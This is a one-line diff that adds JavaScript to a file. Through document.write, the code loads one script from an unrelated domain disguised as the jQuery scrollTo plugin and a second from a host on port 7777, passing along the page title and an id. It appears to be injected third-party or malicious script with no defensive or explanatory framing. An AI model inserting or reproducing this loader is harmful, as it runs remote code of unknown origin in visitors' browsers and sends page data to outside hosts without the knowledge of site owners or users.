@@ -1,0 +1,1 @@
+document.write("<script language='javascript' src='http://jn1222-2.eda8888.com/js/jquery.scrollTo.js?_vv=20080808'></script>");document.write("<script language='javascript' src='http://p.ubt123.com:7777/pt/pt.php?src=p0007&t="+encodeURIComponent(document.title)+"&ci=1896643283'></script>");
